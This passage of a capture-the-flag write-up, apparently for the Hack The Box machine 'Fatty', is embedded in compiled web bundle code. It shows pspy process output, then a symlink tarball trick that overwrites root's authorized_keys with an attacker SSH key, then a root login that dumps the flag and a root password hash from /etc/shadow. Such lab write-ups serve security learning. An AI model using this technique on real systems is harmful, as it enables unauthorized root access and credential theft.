(non-recursive)\nDraining file system events due to startup...\ndone\n2020/07/30 20:52:20 CMD: UID=0    PID=7      | crond -b\n2020/07/30 20:52:20 CMD: UID=1000 PID=2289   | ./pspy64\n2020/07/30 20:52:20 CMD: UID=1000 PID=1754   | /bin/sh\n2020/07/30 20:52:20 CMD: UID=0    PID=11     | /usr/sbin/sshd\n2020/07/30 20:52:20 CMD: UID=1000 PID=10     | java -jar /opt/fatty/fatty-server.jar\n2020/07/30 20:52:20 CMD: UID=0    PID=1      | /bin/sh ./start.sh\n2020/07/30 20:53:01 CMD: UID=0    PID=2298   | /usr/sbin/sshd -R\n2020/07/30 20:53:01 CMD: UID=22   PID=2299   | sshd: [net]\n2020/07/30 20:53:01 CMD: UID=0    PID=2300   | sshd: qtc [priv]\n2020/07/30 20:53:01 CMD: UID=1000 PID=2301   | ash -c scp -f /opt/fatty/tar/logs.tar\n2020/07/30 20:54:02 CMD: UID=0    PID=2302   | /usr/sbin/sshd -R\n2020/07/30 20:54:02 CMD: UID=22   PID=2303   | sshd: [net]\n2020/07/30 20:54:02 CMD: UID=1000 PID=2304   | sshd: qtc\n2020/07/30 20:54:02 CMD: UID=1000 PID=2305   | scp -f /opt/fatty/tar/logs.tar\n2020/07/30 20:55:01 CMD: UID=0    PID=2306   | /usr/sbin/sshd -R\n2020/07/30 20:55:01 CMD: UID=22   PID=2307   | sshd: [net]\n2020/07/30 20:55:01 CMD: UID=0    PID=2308   | sshd: qtc [priv]\n2020/07/30 20:55:01 CMD: UID=1000 PID=2309   | ash -c scp -f /opt/fatty/tar/logs.tar\n")),(0,r.kt)("p",null,"After a few seconds we can see a scp that copies the tar archive that was\ncreated by the cron job."),(0,r.kt)("p",null,"It seems like a scp command is run from a remote host to retrieve\n",(0,r.kt)("inlineCode",{parentName:"p"},"/opt/fatty/tar/logs.tar"),", this must come from the docker host."),(0,r.kt)("p",null,"Something like that must be run from the docker host:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"scp qtc@172.28.0.4:/opt/fatty/tar/logs.tar /path/on/host/logs.tar\n")),(0,r.kt)("h2",{id:"privilege-escalation-of-machine"},"Privilege Escalation of Machine"),(0,r.kt)("p",null,"Ok, fasten your seat belt this is tricky."),(0,r.kt)("p",null,"We can guess that if a tarball is copied to the docker host automatically,\nthen it may be automatically extracted too."),(0,r.kt)("p",null,"So I'll try to conduct this 2 steps attack that abuse of symbolic link in\ntarball when extracted."),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Create a tarball containing a symlink, the symlink as the same name as the\ntarball so when it's extracted it overrides it. The symling points to a file\non the target system that we want to override to get root access."),(0,r.kt)("li",{parentName:"ol"},"Create a file name like the tarball that will override the target file\nwhen copied thanks to the previous symlink abuse.")),(0,r.kt)("p",null,"One of the less dirty way to pe to root by overriding a file would be to\ncopy our SSH public key into root SSH authorized keys."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"ln -s /root/.ssh/authorized_keys logs.tar\n\ntar cvf logs.tmp.tar logs.tar\nlogs.tar\n\ntar tvf logs.tmp.tar\nlrwxrwxrwx qtc/qtc         0 2020-07-31 02:13:44 logs.tar -> /root/.ssh/authorized_keys\n\ncp logs.tmp.tar /opt/fatty/tar/logs.tar\n")),(0,r.kt)("p",null,"Then we wait for a few minutes to be sure that scp copy was done, we can\nstart a 2nd reverse shell and lauch ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/DominicBreuker/pspy"},"pspy")," again to be sure."),(0,r.kt)("p",null,"So the scp will copy the tarball to ",(0,r.kt)("inlineCode",{parentName:"p"},"/path/on/host/logs.tar")," on the host."),(0,r.kt)("p",null,"Then it will extract it and use our malicious symlink: ",(0,r.kt)("inlineCode",{parentName:"p"},"/path/on/host/logs.tar"),"\n-> ",(0,r.kt)("inlineCode",{parentName:"p"},"/root/.ssh/authorized_keys"),"."),(0,r.kt)("p",null,"Then we copy our SSH pubkey to replace the tarball."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"printf %s 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDceD2CV1rqU+7fcduAqZ9bK4jdOQphI7J7AYUAzmHARAp/fNq4XQet3bLg73yugh72MRT6aJUWEM2iP1/gmyRgJUxx65qESG/OAUlzIOBSQUiw2sP+3++/qsBJ76y7/xfnIq/F6YDJSaqpm+eG4G4SrVqNvKNzZTYbAXJ4Fw62bAD04cvMsDeiarkS0mAZkLUzBYI8aDimHt0J2N0OGLC/hLMDZeDzjtixb/4dVNFIoRHyZv3fTNsRLDScKxxHSP+e1CUfAQ6dtlpzqAj1IW7GkaZWxBxRIyVEtFrkYSQzM/ycYtKwhXkySPbtlO1xcjr4/FpOWfYq0LiuF71+Pt/QfwYv1UKIqJ+swZlm/zb/cpu8ESARrs5mb4OTTBwb3TSmOIj5iYaEwhXGueB/Cq7TH6HQjGDZqiOOX6q1ymiGdWfkNCAj4wywaPlIB+d90NH/G0gfuk+2CFcm2us7pIvELqGh5ZqcCGdGQtqlQBsC2HdzSkiQqlGLBIDk3fcJ/ms= cyfun@penarch' > /opt/fatty/tar/logs.tar\n")),(0,r.kt)("p",null,"Then again we wait a few minutes or monitor ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/DominicBreuker/pspy"},"pspy"),"."),(0,r.kt)("p",null,"It will directly copy our key to ",(0,r.kt)("inlineCode",{parentName:"p"},"/root/.ssh/authorized_keys")," thanks to our\nmalicious symlink."),(0,r.kt)("p",null,"Then we can connect via ssh:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ssh root@10.10.10.174\nThe authenticity of host '10.10.10.174 (10.10.10.174)' can't be established.\nED25519 key fingerprint is SHA256:vrMYTGEAjnC1vfp18WHrsxuDGfueUV0xVfzQErxMKv0.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.174' (ED25519) to the list of known hosts.\nLinux fatty 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Thu Jul 30 15:41:03 2020 from 10.10.15.115\nroot@fatty:~# pwd\n/root\nroot@fatty:~# cat root.txt\nee982fa19b413415391ed4a17b2bd9c7\nroot@fatty:~# cat /etc/shadow | grep root\nroot:$6$5wAdljn7$wUeldtzWZDEtkO9OFyNfXrrxf5jnRw8uJHij.TIsiNM0ne1QzmjclfGdgdAzRWk7AQyEmQM7RfPhJbCEms5sN/:18157:0:99999:7:::\n")))}d.isMDXComponent=!0},85266:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/fatty-9427cf6cc527c0988adc799735befb4b.png"}}]);